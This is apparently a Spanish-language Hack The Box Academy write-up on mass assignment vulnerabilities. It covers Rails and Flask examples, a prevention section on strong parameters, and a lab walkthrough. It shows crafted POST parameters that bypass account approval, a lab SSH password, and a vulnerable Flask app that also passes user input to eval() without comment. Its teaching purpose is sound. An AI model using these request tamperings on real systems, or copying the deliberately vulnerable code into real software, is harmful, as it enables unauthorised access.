
# Asignación masiva de archivos web

Varios frameworks ofrecen funciones de asignación masiva muy útiles para reducir la carga de trabajo de los desarrolladores. Gracias a esto, los programadores pueden insertar directamente un conjunto completo de datos ingresados ​​por el usuario desde un formulario a un objeto o una base de datos. Esta función se suele utilizar `sin una whitelist` para proteger los campos de la entrada del usuario. Un atacante podría aprovechar esta vulnerabilidad para robar información confidencial o destruir datos.

La vulnerabilidad de asignación masiva web es un tipo de vulnerabilidad de seguridad en la que los atacantes pueden modificar los atributos del modelo de una aplicación a través de los parámetros enviados al servidor. Al invertir el código, los atacantes pueden ver estos parámetros y, al asignar valores a parámetros críticos desprotegidos durante la solicitud HTTP, pueden editar los datos de una base de datos y cambiar la funcionalidad prevista de una aplicación.

Ruby on Rails es un framework de aplicaciones web que es vulnerable a este tipo de ataques. El siguiente ejemplo muestra cómo los atacantes pueden aprovechar la vulnerabilidad de asignación masiva en Ruby on Rails. Supongamos que tenemos un modelo `User` con los siguientes atributos:

```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```

El modelo anterior especifica que solo se permite la asignación masiva de los atributos `username` y `email`. Sin embargo, los atacantes pueden modificar otros atributos alterando los parámetros enviados al servidor. Supongamos que el servidor recibe los siguientes parámetros.

```javascript
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```

Aunque el modelo `User` no indica explícitamente que el atributo `admin` es accesible, el atacante puede modificarlo porque está presente en los argumentos. Eludiendo cualquier control de acceso que pueda existir, el atacante puede enviar estos datos como parte de una solicitud POST al servidor para establecer un usuario con privilegios de administrador.

***

## <mark style="color:purple;">Explotación de la vulnerabilidad de asignación masiva</mark>

Supongamos que nos encontramos con la siguiente aplicación que cuenta con una aplicación web de Asset Manager. Supongamos también que se nos ha facilitado el código fuente de la aplicación. Al completar el paso de registro, obtenemos el mensaje `Success!!` y podemos intentar iniciar sesión.

![pendiente](https://academy.hackthebox.com/storage/modules/113/mass_assignment/pending.png)

Después de iniciar sesión, aparece el mensaje `Account is pending approval`. El administrador de esta aplicación web debe aprobar nuestro registro. Al revisar el código Python del archivo `/opt/asset-manager/app.py`, se muestra el siguiente fragmento.

```python
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')
```

Podemos ver que la aplicación está verificando si el valor `k` está configurado. Si es así, permite al usuario iniciar sesión. En el código a continuación, también podemos ver que si configuramos el parámetro `confirmed` durante el registro, se inserta `cond` como `True` y nos permite omitir el paso de verificación del registro.

```python
try:
  if request.form['confirmed']:
    cond=True
except:
      cond=False
with sqlite3.connect("database.db") as con:
  cur = con.cursor()
  cur.execute('select * from users where username=?',(username,))
  if cur.fetchone():
    return render_template('index.html',value='User exists!!')
  else:
    cur.execute('insert into users values(?,?,?)',(username,password,cond))
    con.commit()
    return render_template('index.html',value='Success!!')
```

En ese caso, lo que deberíamos intentar es registrar otro usuario y probar a configurar el parámetro `confirmed` con un valor aleatorio. Con Burp Suite, podemos capturar la solicitud HTTP POST a la página `/register` y configurar los parámetros:

```
username=new&password=test&confirmed=test.
```

![masa oculta](https://academy.hackthebox.com/storage/modules/113/mass_assignment/mass_hidden.png)

Ahora podemos intentar iniciar sesión en la aplicación usando las credenciales `new:test`.

![conectado](https://academy.hackthebox.com/storage/modules/113/mass_assignment/loggedin.png)

La vulnerabilidad de asignación masiva se explotó con éxito y ahora iniciamos sesión en la aplicación web sin esperar a que el administrador apruebe nuestra solicitud de registro.

***

## <mark style="color:purple;">Prevención</mark>

Para evitar este tipo de ataque, se deben asignar explícitamente los atributos a los campos permitidos o utilizar los métodos de lista blanca que proporciona el marco para comprobar los atributos que se pueden asignar en masa. El siguiente ejemplo muestra cómo utilizar parámetros fuertes en el controlador. `User`

```ruby
class UsersController < ApplicationController
  def create
    @user = User.new(user_params)
    if @user.save
      redirect_to @user
    else
      render 'new'
    end
  end

  private

  def user_params
    params.require(:user).permit(:username, :email)
  end
end
```

En el ejemplo anterior, el método `user_params` devuelve un nuevo hash que incluye solo los atributos `username` y `email`, ignorando cualquier otra entrada que el cliente pueda haber enviado. Al hacer esto, nos aseguramos de que solo los atributos permitidos explícitamente puedan modificarse mediante la asignación masiva.

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.205.15 (ACADEMY-ACA-CLAMP)
Usuario " root "
Contraseña " !x4;EW[ZLwmDx?=w "
```

> Colocamos el código fuente de la aplicación que acabamos de cubrir en `/opt/asset-manager/app.py` dentro del objetivo de este ejercicio, pero cambiamos el nombre del parámetro crucial. Inicie sesión en el objetivo mediante SSH, vea el código fuente e ingrese el nombre del parámetro que se debe manipular para iniciar sesión en la aplicación web Asset Manager.

### Escaneo de puertos

```bash
sudo nmap -v -sV -T5 10.129.205.15               

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Encontramos el puerto 300 abierto, que en principio nos interesa.

### Acceso Web

Al acceder por el puerto 3000 nos encontramos un panel de registro / login:

<figure><img src="/files/pcjwlB8AqgmWV90e3yBG" alt=""><figcaption></figcaption></figure>

Al registrarnos nos da un `Success!!`

<figure><img src="/files/xg5UsTvewrbZsPvCloO2" alt=""><figcaption></figcaption></figure>

Pero al loguearnos nos dice que tiene que aprobarlo un administrador:

<figure><img src="/files/jrXyjXmTHBv960o08vTl" alt=""><figcaption></figcaption></figure>

### Acceso por SSH

Accedemos por SSH y vemos el contenido del script:

```python
root@htb:~# cat /opt/asset-manager/app.py

#!/usr/bin/python
import os
import sqlite3
from flask import Flask,request,session,render_template,redirect

app=Flask(__name__)
app.secret_key=os.urandom(24)

@app.route('/')
def index():
	return render_template('index.html')

@app.route('/login',methods=['GET','POST'])
def login():
	if request.method=='GET':
		return render_template('login.html')
	else:
		username=request.form['username']
		password=request.form['password']
		with sqlite3.connect("database.db") as con:
			cur = con.cursor()
			for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
				if k:
					session['user']=i
					return redirect("/home",code=302)
				else:
					return render_template('login.html',value='Account is pending for approval')
		return render_template('login.html',value='Invalid Credentials!!')

@app.route('/home',methods=['GET'])
def home():
	if session:
		return render_template('home.html')
	else:
		return redirect('/',code=302)

@app.route('/logout')
def logout():
	session.clear
	return redirect('/',code=302)

@app.route('/register',methods=['GET','POST'])
def register():
	if request.method=='GET':
		return render_template('index.html')
	else:
		username=request.form['username']
		password=request.form['password']
		try:
			if request.form['active']:
				cond=True
		except:
				cond=False
		with sqlite3.connect("database.db") as con:
			cur = con.cursor()
			cur.execute('select * from users where username=?',(username,))
			if cur.fetchone():
				return render_template('index.html',value='User exists!!')
			else:
				cur.execute('insert into users values(?,?,?)',(username,password,cond))
				con.commit()
				return render_template('index.html',value='Success!!')

@app.route('/profit',methods=['GET','POST'])
def profit():
	if session:
		if request.method=='GET':
			return render_template('profit.html')
		else:
			expr=request.form['sp']
			result=eval(expr)
			return render_template('profit.html',value=result)

	else:
		return redirect('/',code=302)

if __name__=="__main__":
	app.run('0.0.0.0',3000)
```

Nos interesa la función `login()`:

```python
def login():
	if request.method=='GET':
		return render_template('login.html')
	else:
		username=request.form['username']
		password=request.form['password']
		with sqlite3.connect("database.db") as con:
			cur = con.cursor()
			for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
				if k:
					session['user']=i
					return redirect("/home",code=302)
				else:
					return render_template('login.html',value='Account is pending for approval')
		return render_template('login.html',value='Invalid Credentials!!')
```

Podemos ver que la aplicación está verificando si el valor `k` está configurado.  En el código a continuación, también podemos ver que si configuramos el parámetro `active` durante el registro, se inserta `cond` como `True` y nos permite omitir el paso de verificación del registro.

```python
			if request.form['active']:
				cond=True
		except:
				cond=False
		with sqlite3.connect("database.db") as 
```

Vamos a intentar es registrar otro usuario y probar a configurar el parámetro `active` con un valor aleatorio. Con Burp Suite, podemos capturar la solicitud HTTP POST a la página `/register` y configurar los parámetros:

```
username=new&password=test&active=test.
```

<figure><img src="/files/pV1xtJzsUJPhXZkLyiyf" alt=""><figcaption></figcaption></figure>

Ahora podemos iniciar sesión en la aplicación usando las credenciales `new:test`, eludiendo la validación:

<figure><img src="/files/qAIJugthSSnqtdKKpc5f" alt=""><figcaption></figcaption></figure>
